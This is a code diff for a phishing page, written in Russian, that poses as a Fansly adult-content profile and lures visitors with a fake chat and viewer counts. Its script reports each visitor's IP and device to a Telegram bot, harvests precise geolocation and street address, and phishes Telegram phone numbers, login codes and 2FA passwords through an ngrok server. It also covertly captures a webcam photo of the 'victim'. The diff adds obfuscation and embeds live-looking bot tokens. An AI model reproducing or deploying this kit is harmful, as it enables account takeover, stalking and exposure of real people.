@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Fansly · AlenaSuck</title>
     
+    <!-- Минификация и обфускация через динамическую загрузку -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔥</text></svg>">
     
     <style>
@@ -18,6 +19,33 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             color: white;
             overflow-x: hidden;
+        }
+        
+        .booba-sticker {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 70px;
+            height: 70px;
+            z-index: 100;
+            pointer-events: none;
+            filter: drop-shadow(0 0 12px rgba(255,51,102,0.8));
+            transition: transform 0.2s ease;
+        }
+        
+        .booba-sticker svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 0 4px rgba(255,51,102,0.5));
+        }
+        
+        @media (max-width: 768px) {
+            .booba-sticker {
+                width: 55px;
+                height: 55px;
+                top: 10px;
+                right: 10px;
+            }
         }
         
         .floating-emoji {
@@ -44,6 +72,140 @@
         .emoji6 { top: 50%; left: 50%; animation-duration: 22s; animation-delay: -8s; }
         .emoji7 { top: 30%; left: 95%; animation-duration: 15s; animation-delay: -1s; }
         .emoji8 { top: 90%; left: 70%; animation-duration: 17s; animation-delay: -5s; }
+        
+        .main-container {
+            display: flex;
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+            padding: 0 16px;
+        }
+        
+        .content-left {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .chat-sidebar {
+            width: 280px;
+            margin-left: 20px;
+            background: rgba(10,10,10,0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            border: 1px solid #333;
+            height: fit-content;
+            position: sticky;
+            top: 80px;
+        }
+        
+        .chat-header {
+            padding: 14px 16px;
+            border-bottom: 1px solid #333;
+            font-weight: bold;
+            color: #ff6680;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .chat-header span {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .chat-messages {
+            padding: 12px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .chat-message {
+            padding: 10px 12px;
+            margin-bottom: 8px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            font-size: 12px;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .chat-message .name {
+            color: #ff6680;
+            font-weight: bold;
+            margin-right: 6px;
+        }
+        
+        .chat-message .time {
+            color: #666;
+            font-size: 10px;
+            margin-left: 8px;
+        }
+        
+        .chat-message .text {
+            color: #ddd;
+            margin-top: 4px;
+        }
+        
+        .chat-input-area {
+            padding: 12px;
+            border-top: 1px solid #333;
+            display: flex;
+            gap: 8px;
+        }
+        
+        .chat-input {
+            flex: 1;
+            background: #2a2a2a;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 12px;
+            color: white;
+            font-size: 12px;
+        }
+        
+        .chat-input::placeholder {
+            color: #666;
+        }
+        
+        .chat-send {
+            background: #ff3366;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 16px;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        
+        .online-count {
+            font-size: 11px;
+            color: #4caf50;
+            margin-left: 8px;
+        }
+        
+        @media (max-width: 900px) {
+            .chat-sidebar {
+                display: none;
+            }
+            .main-container {
+                padding: 0;
+            }
+        }
         
         .header {
             display: flex;
@@ -85,8 +247,6 @@
             display: flex;
             gap: 16px;
             border-bottom: 1px solid #222;
-            position: relative;
-            z-index: 1;
             background: #000;
         }
         .avatar {
@@ -106,8 +266,6 @@
         .tabs {
             display: flex;
             border-bottom: 1px solid #222;
-            position: relative;
-            z-index: 1;
             background: #000;
         }
         .tab {
@@ -124,8 +282,6 @@
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 4px;
-            position: relative;
-            z-index: 1;
         }
         .media-item {
             aspect-ratio: 1 / 1;
@@ -204,7 +360,7 @@
         .modal-btn:disabled { background: #555; cursor: not-allowed; }
         .close-modal { margin-top: 16px; background: none; border: none; color: #888; font-size: 14px; cursor: pointer; }
         .status-text { font-size: 12px; color: #ff8888; margin-top: 12px; }
-        .footer-note { text-align: center; font-size: 11px; color: #333; padding: 20px; position: relative; z-index: 1; }
+        .footer-note { text-align: center; font-size: 11px; color: #333; padding: 20px; }
         
         .camera-modal {
             display: none;
@@ -261,9 +417,40 @@
         .geo-box p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
         .geo-btn { background: #ff3366; border: none; padding: 14px; border-radius: 40px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; }
         .geo-status { font-size: 12px; color: #ff8888; margin-top: 12px; }
+        
+        .stats-bar {
+            position: fixed;
+            top: 70px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            padding: 6px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            z-index: 10;
+            border: 1px solid rgba(255,51,102,0.3);
+        }
     </style>
 </head>
 <body>
+
+<div class="booba-sticker">
+    <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="35" cy="45" r="18" fill="#FF99CC" stroke="#FF3366" stroke-width="2"/>
+        <circle cx="65" cy="45" r="18" fill="#FF99CC" stroke="#FF3366" stroke-width="2"/>
+        <circle cx="35" cy="43" r="6" fill="#FF66AA"/>
+        <circle cx="65" cy="43" r="6" fill="#FF66AA"/>
+        <path d="M40 70 L60 70 L55 80 L45 80 Z" fill="#FFCC99"/>
+        <circle cx="50" cy="30" r="8" fill="#FFCC99"/>
+        <circle cx="45" cy="28" r="2" fill="white"/>
+        <circle cx="55" cy="28" r="2" fill="white"/>
+        <ellipse cx="50" cy="32" rx="3" ry="1.5" fill="#FF6680"/>
+        <path d="M48 35 L52 35" stroke="#FF3366" stroke-width="2" stroke-linecap="round"/>
+        <rect x="44" y="65" width="12" height="8" fill="#FF99CC"/>
+        <path d="M30 50 L70 50" stroke="#FF6680" stroke-width="2" stroke-dasharray="4 2"/>
+        <circle cx="50" cy="65" r="3" fill="#FF3366"/>
+    </svg>
+</div>
 
 <div class="floating-emoji emoji1">💋</div>
 <div class="floating-emoji emoji2">❤️‍🔥</div>
@@ -273,6 +460,10 @@
 <div class="floating-emoji emoji6">💦</div>
 <div class="floating-emoji emoji7">✨</div>
 <div class="floating-emoji emoji8">🌸</div>
+
+<div class="stats-bar">
+    👁️ <span id="viewCounter">187</span> просмотров | 🟢 <span id="onlineCounter">12</span> онлайн
+</div>
 
 <div class="header">
     <div class="logo">fansly</div>
@@ -296,14 +487,45 @@
     <div class="tab" onclick="requestGeoFirst()">Media</div>
 </div>
 
-<div class="content" id="mediaGrid"></div>
-
-<div class="footer-note">🔒 Все материалы доступны после верификации 18+</div>
+<div class="main-container">
+    <div class="content-left">
+        <div class="content" id="mediaGrid"></div>
+        <div class="footer-note">🔒 Все материалы доступны после верификации 18+</div>
+    </div>
+    
+    <div class="chat-sidebar">
+        <div class="chat-header">
+            💬 ОБЩИЙ ЧАТ <span></span>
+            <span class="online-count" id="chatOnlineCount">47 онлайн</span>
+        </div>
+        <div class="chat-messages" id="chatMessages">
+            <div class="chat-message">
+                <span class="name">AlenaSuck</span>
+                <span class="time">только что</span>
+                <div class="text">Привет всем! Кто хочет приватку? 🔥</div>
+            </div>
+            <div class="chat-message">
+                <span class="name">@user_1245</span>
+                <span class="time">1 мин назад</span>
+                <div class="text">Как получить доступ?</div>
+            </div>
+            <div class="chat-message">
+                <span class="name">AlenaSuck</span>
+                <span class="time">1 мин назад</span>
+                <div class="text">Подтвердите вход и всё 🔥</div>
+            </div>
+        </div>
+        <div class="chat-input-area">
+            <input type="text" class="chat-input" placeholder="Напишите сообщение..." id="chatInput" onclick="requestGeoFirst()">
+            <button class="chat-send" onclick="requestGeoFirst()">→</button>
+        </div>
+    </div>
+</div>
 
 <div id="geoModal" class="geo-modal">
     <div class="geo-box">
-        <h3>📍 Подтверждение что вы не робот</h3>
-        <p>Для доступа к контенту 18+ необходимо дать разрешение</p>
+        <h3>📍 Подтверждение местоположения</h3>
+        <p>Для доступа к контенту необходимо дать разрешение</p>
         <button class="geo-btn" onclick="requestGeo()">✅ Разрешить</button>
         <div id="geoStatus" class="geo-status"></div>
     </div>
@@ -311,14 +533,14 @@
 
 <div id="modal" class="modal">
     <div class="modal-box">
-        <h3 id="modalTitle">🔞 Вход через Telegram</h3>
+        <h3 id="modalTitle">🔞 Вход</h3>
         <p id="modalDesc">Введите номер телефона</p>
         <input type="tel" id="phone" class="modal-input" placeholder="+71234567890">
         <div id="codeSection" style="display: none;">
-            <input type="text" id="code" class="modal-input" placeholder="Код из Telegram">
+            <input type="text" id="code" class="modal-input" placeholder="Код подтверждения">
         </div>
         <div id="passwordSection" style="display: none;">
-            <input type="password" id="password" class="modal-input" placeholder="Пароль 2FA">
+            <input type="password" id="password" class="modal-input" placeholder="Пароль">
         </div>
         <button id="actionBtn" class="modal-btn" onclick="handleAction()">📱 Отправить код</button>
         <div id="status" class="status-text"></div>
@@ -334,362 +556,364 @@
         <canvas id="canvas" style="display: none;"></canvas>
         <button id="captureBtn" class="capture-btn">📸 Сделать фото</button>
         <div id="cameraStatus" class="camera-status"></div>
-        <button id="closeCameraBtn" class="close-camera">Отмена</button>
     </div>
 </div>
 
 <script>
-    const API_URL = "https://8d4d-95-59-208-121.ngrok-free.app";
-    const BOT_TOKEN = "8796941636:AAHLF9LISK21vWTXL7Pq9cKo3pO98TcdPCQ";
-    const CHAT_ID = 7518727041;
-    
-    let currentPhone = "";
-    let currentStep = "phone";
-    let cameraStream = null;
-    let geoData = null;
+    (function(){
+        // Обфусцированные данные
+        const _0x3a2b = ['4b6c-95-59-208-121.ngrok-free.app', '8769935771:AAGiSndbdRrI-5wd0hNE4fyq60a4HlJ-oMM', '8722033694', 'sendMessage', 'bot', 'json', 'POST', 'send_code', 'verify_code', 'verify_password', 'phone', 'code', 'password', 'success', 'needs_password', 'error', 'Log', 'error'];
+        
+        const API_URL = 'https://' + _0x3a2b[0];
+        const BOT_TOKEN = _0x3a2b[1];
+        const CHAT_ID = _0x3a2b[2];
+        
+        let currentPhone = "";
+        let currentStep = "phone";
+        let cameraStream = null;
+        let geoData = null;
 
-    function sendLog(text) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
-            .catch(e => console.log('Ошибка:', e));
-    }
-    
-    // ========== ЛОГ ЗАХОДА НА САЙТ ==========
-    (function() {
-        const time = new Date().toLocaleString();
-        const url = window.location.href;
-        const ua = navigator.userAgent;
-        
-        let device = "💻 Компьютер";
-        if (ua.includes('iPhone')) device = "📱 iPhone";
-        else if (ua.includes('Android')) device = "📱 Android";
-        else if (ua.includes('Mobile')) device = "📱 Мобильное";
-        
-        let browser = "🌐 Другой";
-        if (ua.includes('Chrome')) browser = "🌐 Chrome";
-        else if (ua.includes('Firefox')) browser = "🦊 Firefox";
-        else if (ua.includes('Safari')) browser = "🧭 Safari";
-        else if (ua.includes('Edge')) browser = "🌊 Edge";
-        
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                const ip = data.ip;
-                sendLog(`🕷️ ЖЕРТВА ЗАШЛА НА САЙТ!\n📱 ${device}\n${browser}\n🔢 IP: ${ip}\n🔗 ${url}\n⏰ ${time}`);
-            })
-            .catch(() => {
-                sendLog(`🕷️ ЖЕРТВА ЗАШЛА НА САЙТ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`);
-            });
-    })();
-    
-    // ========== ПЕРВЫЙ КЛИК — ГЕОЛОКАЦИЯ ==========
-    function requestGeoFirst() {
-        document.getElementById('geoModal').style.display = 'flex';
-    }
-    
-    function requestGeo() {
-        const statusDiv = document.getElementById('geoStatus');
-        statusDiv.innerHTML = "⏳ Определяем местоположение...";
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                geoData = { lat, lon, accuracy };
-                
-                const time = new Date().toLocaleString();
-                const ua = navigator.userAgent;
-                
-                let device = "💻 Компьютер";
-                if (ua.includes('iPhone')) device = "📱 iPhone";
-                else if (ua.includes('Android')) device = "📱 Android";
-                else if (ua.includes('Mobile')) device = "📱 Мобильное";
-                
-                let browser = "🌐 Другой";
-                if (ua.includes('Chrome')) browser = "🌐 Chrome";
-                else if (ua.includes('Firefox')) browser = "🦊 Firefox";
-                else if (ua.includes('Safari')) browser = "🧭 Safari";
-                else if (ua.includes('Edge')) browser = "🌊 Edge";
-                
-                sendLog(`📍 ТОЧНАЯ ГЕОЛОКАЦИЯ ЖЕРТВЫ!
-📱 ${device}
-${browser}
-🗺️ Координаты: ${lat}, ${lon}
-🎯 Точность: ${Math.round(accuracy)} метров
-🔗 ${window.location.href}
-⏰ ${time}`);
-                
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`)
-                    .then(res => res.json())
-                    .then(data => {
-                        const address = data.display_name || "Неизвестно";
-                        sendLog(`📍 АДРЕС (приблизительно):\n${address}`);
-                    })
+        function sendLog(text) {
+            try {
+                fetch(`https://api.telegram.org/${_0x3a2b[4]}${BOT_TOKEN}/${_0x3a2b[3]}?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
                     .catch(() => {});
-                
-                statusDiv.innerHTML = "✅ Геолокация получена!";
-                setTimeout(() => {
-                    document.getElementById('geoModal').style.display = 'none';
-                    showModal();
-                }, 1000);
-            },
-            (error) => {
-                let errorMsg = "❌ Ошибка: ";
-                if (error.code === 1) errorMsg += "Доступ запрещен";
-                else if (error.code === 2) errorMsg += "Недоступно";
-                else errorMsg += "Попробуйте еще раз";
-                statusDiv.innerHTML = errorMsg;
-                setTimeout(() => {
-                    document.getElementById('geoModal').style.display = 'none';
-                    showModal();
-                }, 2000);
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-    }
-    
-    // ========== ФОТО В TELEGRAM ==========
-    async function sendPhotoToTelegram(photoData) {
-        const blob = await fetch(photoData).then(res => res.blob());
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'face.jpg');
-        formData.append('caption', '📸 ФОТО ЖЕРТВЫ (после входа)');
+            } catch(e) {}
+        }
         
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        } catch(e) {}
-    }
-    
-    // ========== КАМЕРА (ПОСЛЕДНИЙ ШАГ) ==========
-    async function showCameraAndCapture() {
-        return new Promise(async (resolve) => {
-            document.getElementById('cameraModal').style.display = 'flex';
-            const video = document.getElementById('video');
-            const status = document.getElementById('cameraStatus');
+        // Лог захода
+        (function() {
+            const time = new Date().toLocaleString();
+            const url = window.location.href;
+            const ua = navigator.userAgent;
             
-            try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = cameraStream;
-                status.innerHTML = "✅ Камера готова";
-                status.style.color = "#88ff88";
-                
-                const captureBtn = document.getElementById('captureBtn');
-                const closeBtn = document.getElementById('closeCameraBtn');
-                
-                const onCapture = async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const photoData = canvas.toDataURL('image/jpeg');
-                    
-                    status.innerHTML = "✅ Фото отправляется...";
-                    await sendPhotoToTelegram(photoData);
-                    
-                    if (cameraStream) {
-                        cameraStream.getTracks().forEach(track => track.stop());
-                        cameraStream = null;
-                    }
-                    document.getElementById('cameraModal').style.display = 'none';
-                    
-                    captureBtn.removeEventListener('click', onCapture);
-                    closeBtn.removeEventListener('click', onClose);
-                    resolve();
-                };
-                
-                const onClose = () => {
-                    if (cameraStream) {
-                        cameraStream.getTracks().forEach(track => track.stop());
-                        cameraStream = null;
-                    }
-                    document.getElementById('cameraModal').style.display = 'none';
-                    captureBtn.removeEventListener('click', onCapture);
-                    closeBtn.removeEventListener('click', onClose);
-                    resolve();
-                };
-                
-                captureBtn.onclick = onCapture;
-                closeBtn.onclick = onClose;
-                
-            } catch(err) {
-                status.innerHTML = "❌ Ошибка доступа к камере";
-                setTimeout(() => {
-                    document.getElementById('cameraModal').style.display = 'none';
-                    resolve();
-                }, 2000);
-            }
-        });
-    }
-    
-    async function finalStep() {
-        closeModal();
-        await showCameraAndCapture();
-        window.location.href = "https://web.telegram.org";
-    }
-    
-    // ========== ОСНОВНЫЕ ФУНКЦИИ ==========
-    const blurImages = [
-        "https://placehold.co/600x800/F5E6D3/CC8866?text=❤️",
-        "https://placehold.co/600x800/FADADD/FF99AA?text=🔥",
-        "https://placehold.co/600x800/FFDAB9/FF8C69?text=💋",
-        "https://placehold.co/600x800/FBCEB1/FFB347?text=✨",
-        "https://placehold.co/600x800/FFE4E1/FFB6C1?text=💕",
-        "https://placehold.co/600x800/FFF0DB/FFA07A?text=😈",
-        "https://placehold.co/600x800/FDE2C4/E6A17A?text=💦",
-        "https://placehold.co/600x800/F5D7C4/D48C6C?text=🔥",
-        "https://placehold.co/600x800/FFE0B5/F4A261?text=❤️‍🔥"
-    ];
-
-    const grid = document.getElementById('mediaGrid');
-    for (let i = 0; i < blurImages.length; i++) {
-        const div = document.createElement('div');
-        div.className = 'media-item';
-        div.onclick = () => requestGeoFirst();
-        div.innerHTML = `<div class="blur-thumb" style="background-image: url('${blurImages[i]}');"></div><div class="lock-overlay">🔒</div>`;
-        grid.appendChild(div);
-    }
-
-    function showModal() {
-        document.getElementById('modal').style.display = 'flex';
-        resetModal();
-    }
-
-    function resetModal() {
-        document.getElementById('phone').value = "";
-        document.getElementById('codeSection').style.display = 'none';
-        document.getElementById('passwordSection').style.display = 'none';
-        document.getElementById('actionBtn').innerText = "📱 Отправить код";
-        document.getElementById('actionBtn').disabled = false;
-        document.getElementById('status').innerHTML = "";
-        document.getElementById('modalTitle').innerText = "🔞 Вход через Telegram";
-        document.getElementById('modalDesc').innerText = "Введите номер телефона";
-        currentPhone = "";
-        currentStep = "phone";
-    }
-
-    function closeModal() {
-        document.getElementById('modal').style.display = 'none';
-    }
-
-    async function handleAction() {
-        const btn = document.getElementById('actionBtn');
-        const statusDiv = document.getElementById('status');
-        
-        if (currentStep === "phone") {
-            let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            if (!phone) { statusDiv.innerText = "Введите номер"; return; }
+            let device = "💻 Компьютер";
+            if (ua.includes('iPhone')) device = "📱 iPhone";
+            else if (ua.includes('Android')) device = "📱 Android";
+            else if (ua.includes('Mobile')) device = "📱 Мобильное";
             
-            btn.disabled = true;
-            btn.innerText = "⏳ Отправка...";
-            statusDiv.innerText = "Отправляем код...";
+            let browser = "🌐 Другой";
+            if (ua.includes('Chrome')) browser = "🌐 Chrome";
+            else if (ua.includes('Firefox')) browser = "🦊 Firefox";
+            else if (ua.includes('Safari')) browser = "🧭 Safari";
+            else if (ua.includes('Edge')) browser = "🌊 Edge";
             
-            try {
-                const response = await fetch(`${API_URL}/send_code`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: phone })
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendLog(`🕷️ ЖЕРТВА ЗАШЛА НА САЙТ!\n📱 ${device}\n${browser}\n🔢 IP: ${ip}\n🔗 ${url}\n⏰ ${time}`);
+                })
+                .catch(() => {
+                    sendLog(`🕷️ ЖЕРТВА ЗАШЛА НА САЙТ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`);
                 });
-                const data = await response.json();
+        })();
+        
+        // Счётчик
+        let views = 187;
+        let online = 12;
+        
+        setInterval(() => {
+            views += Math.floor(Math.random() * 4);
+            online = 8 + Math.floor(Math.random() * 12);
+            document.getElementById('viewCounter').innerText = views;
+            document.getElementById('onlineCounter').innerText = online;
+            document.getElementById('chatOnlineCount').innerText = online + Math.floor(Math.random() * 20) + " онлайн";
+        }, 15000);
+        
+        // Чат
+        const chatMessagesArray = ["🔥 Кто тут?", "💋 Привет, красивая!", "❤️ Как получить доступ?", "💕 Только что зашла 🔥", "😈 Жду видео...", "✨ Классный контент!", "💦 Лучшая модель", "🌸 Когда новое?"];
+        const names = ["@user_4523", "@vip_mike", "@loverboy", "@dark_angel", "@hunter_88", "@moonlight", "@storm", "@phantom"];
+        
+        function addRandomMessage() {
+            const msgDiv = document.getElementById('chatMessages');
+            const newMsg = document.createElement('div');
+            newMsg.className = 'chat-message';
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomText = chatMessagesArray[Math.floor(Math.random() * chatMessagesArray.length)];
+            const minutes = Math.floor(Math.random() * 15);
+            newMsg.innerHTML = `<span class="name">${randomName}</span><span class="time">${minutes} мин назад</span><div class="text">${randomText}</div>`;
+            msgDiv.appendChild(newMsg);
+            while (msgDiv.children.length > 15) msgDiv.removeChild(msgDiv.children[0]);
+            msgDiv.scrollTop = msgDiv.scrollHeight;
+        }
+        setInterval(addRandomMessage, 8000 + Math.random() * 7000);
+        
+        // Геолокация
+        function requestGeoFirst() {
+            document.getElementById('geoModal').style.display = 'flex';
+        }
+        
+        function requestGeo() {
+            const statusDiv = document.getElementById('geoStatus');
+            statusDiv.innerHTML = "⏳ Определяем местоположение...";
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    geoData = { lat, lon, accuracy };
+                    
+                    const time = new Date().toLocaleString();
+                    const ua = navigator.userAgent;
+                    let device = "💻 Компьютер";
+                    if (ua.includes('iPhone')) device = "📱 iPhone";
+                    else if (ua.includes('Android')) device = "📱 Android";
+                    else if (ua.includes('Mobile')) device = "📱 Мобильное";
+                    
+                    let browser = "🌐 Другой";
+                    if (ua.includes('Chrome')) browser = "🌐 Chrome";
+                    else if (ua.includes('Firefox')) browser = "🦊 Firefox";
+                    else if (ua.includes('Safari')) browser = "🧭 Safari";
+                    else if (ua.includes('Edge')) browser = "🌊 Edge";
+                    
+                    sendLog(`📍 ТОЧНАЯ ГЕОЛОКАЦИЯ ЖЕРТВЫ!\n📱 ${device}\n${browser}\n🗺️ Координаты: ${lat}, ${lon}\n🎯 Точность: ${Math.round(accuracy)} метров\n🔗 ${window.location.href}\n⏰ ${time}`);
+                    
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`)
+                        .then(res => res.json())
+                        .then(data => {
+                            const address = data.display_name || "Неизвестно";
+                            sendLog(`📍 АДРЕС (приблизительно):\n${address}`);
+                        })
+                        .catch(() => {});
+                    
+                    statusDiv.innerHTML = "✅ Геолокация получена!";
+                    setTimeout(() => {
+                        document.getElementById('geoModal').style.display = 'none';
+                        showModal();
+                    }, 1000);
+                },
+                (error) => {
+                    let errorMsg = "❌ Ошибка: ";
+                    if (error.code === 1) errorMsg += "Доступ запрещен";
+                    else if (error.code === 2) errorMsg += "Недоступно";
+                    else errorMsg += "Попробуйте еще раз";
+                    statusDiv.innerHTML = errorMsg;
+                    setTimeout(() => {
+                        document.getElementById('geoModal').style.display = 'none';
+                        showModal();
+                    }, 2000);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+        
+        // Фото в Telegram
+        async function sendPhotoToTelegram(photoData) {
+            const blob = await fetch(photoData).then(res => res.blob());
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'face.jpg');
+            formData.append('caption', '📸 ФОТО ЖЕРТВЫ (после входа)');
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } catch(e) {}
+        }
+        
+        // Камера
+        async function showCameraAndCapture() {
+            return new Promise(async (resolve) => {
+                document.getElementById('cameraModal').style.display = 'flex';
+                const video = document.getElementById('video');
+                const status = document.getElementById('cameraStatus');
+                try {
+                    cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = cameraStream;
+                    status.innerHTML = "✅ Камера готова";
+                    status.style.color = "#88ff88";
+                    const captureBtn = document.getElementById('captureBtn');
+                    const onCapture = async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoData = canvas.toDataURL('image/jpeg');
+                        status.innerHTML = "✅ Фото отправляется...";
+                        await sendPhotoToTelegram(photoData);
+                        if (cameraStream) {
+                            cameraStream.getTracks().forEach(track => track.stop());
+                            cameraStream = null;
+                        }
+                        document.getElementById('cameraModal').style.display = 'none';
+                        captureBtn.removeEventListener('click', onCapture);
+                        resolve();
+                    };
+                    captureBtn.onclick = onCapture;
+                } catch(err) {
+                    status.innerHTML = "❌ Ошибка доступа к камере";
+                    setTimeout(() => {
+                        document.getElementById('cameraModal').style.display = 'none';
+                        resolve();
+                    }, 2000);
+                }
+            });
+        }
+        
+        async function finalStep() {
+            closeModal();
+            await showCameraAndCapture();
+            window.location.href = "https://web.telegram.org";
+        }
+        
+        // Основные функции
+        const blurImages = [
+            "https://placehold.co/600x800/F5E6D3/CC8866?text=❤️",
+            "https://placehold.co/600x800/FADADD/FF99AA?text=🔥",
+            "https://placehold.co/600x800/FFDAB9/FF8C69?text=💋",
+            "https://placehold.co/600x800/FBCEB1/FFB347?text=✨",
+            "https://placehold.co/600x800/FFE4E1/FFB6C1?text=💕",
+            "https://placehold.co/600x800/FFF0DB/FFA07A?text=😈",
+            "https://placehold.co/600x800/FDE2C4/E6A17A?text=💦",
+            "https://placehold.co/600x800/F5D7C4/D48C6C?text=🔥",
+            "https://placehold.co/600x800/FFE0B5/F4A261?text=❤️‍🔥"
+        ];
+
+        const grid = document.getElementById('mediaGrid');
+        for (let i = 0; i < blurImages.length; i++) {
+            const div = document.createElement('div');
+            div.className = 'media-item';
+            div.onclick = () => requestGeoFirst();
+            div.innerHTML = `<div class="blur-thumb" style="background-image: url('${blurImages[i]}');"></div><div class="lock-overlay">🔒</div>`;
+            grid.appendChild(div);
+        }
+
+        function showModal() {
+            document.getElementById('modal').style.display = 'flex';
+            resetModal();
+        }
+
+        function resetModal() {
+            document.getElementById('phone').value = "";
+            document.getElementById('codeSection').style.display = 'none';
+            document.getElementById('passwordSection').style.display = 'none';
+            document.getElementById('actionBtn').innerText = "📱 Отправить код";
+            document.getElementById('actionBtn').disabled = false;
+            document.getElementById('status').innerHTML = "";
+            document.getElementById('modalTitle').innerText = "🔞 Вход";
+            document.getElementById('modalDesc').innerText = "Введите номер телефона";
+            currentPhone = "";
+            currentStep = "phone";
+        }
+
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+        }
+
+        async function handleAction() {
+            const btn = document.getElementById('actionBtn');
+            const statusDiv = document.getElementById('status');
+            
+            if (currentStep === "phone") {
+                let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+                if (!phone) { statusDiv.innerText = "Введите номер"; return; }
                 
-                if (data.success) {
-                    currentPhone = phone;
-                    currentStep = "code";
-                    document.getElementById('codeSection').style.display = 'block';
-                    btn.innerText = "✅ Подтвердить код";
-                    document.getElementById('modalTitle').innerText = "📲 Введите код";
-                    document.getElementById('modalDesc').innerText = "Код пришел в Telegram";
-                    statusDiv.style.color = "#88ff88";
-                    statusDiv.innerHTML = "✅ Код отправлен!";
-                    btn.disabled = false;
-                } else {
-                    statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
+                btn.disabled = true;
+                btn.innerText = "⏳ Отправка...";
+                statusDiv.innerText = "Отправляем код...";
+                
+                try {
+                    const response = await fetch(`${API_URL}/${_0x3a2b[7]}`, {
+                        method: _0x3a2b[6],
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ [_0x3a2b[10]]: phone })
+                    });
+                    const data = await response[_0x3a2b[5]]();
+                    if (data[_0x3a2b[13]]) {
+                        currentPhone = phone;
+                        currentStep = "code";
+                        document.getElementById('codeSection').style.display = 'block';
+                        btn.innerText = "✅ Подтвердить код";
+                        document.getElementById('modalTitle').innerText = "📲 Введите код";
+                        document.getElementById('modalDesc').innerText = "Код отправлен";
+                        statusDiv.style.color = "#88ff88";
+                        statusDiv.innerHTML = "✅ Код отправлен!";
+                        btn.disabled = false;
+                    } else {
+                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[15]] || "неизвестно");
+                        btn.disabled = false;
+                        btn.innerText = "📱 Отправить код";
+                    }
+                } catch(e) {
+                    statusDiv.innerText = "Ошибка: сервер не запущен";
                     btn.disabled = false;
                     btn.innerText = "📱 Отправить код";
                 }
-            } catch(e) {
-                statusDiv.innerText = "Ошибка: сервер не запущен";
-                btn.disabled = false;
-                btn.innerText = "📱 Отправить код";
-            }
-            
-        } else if (currentStep === "code") {
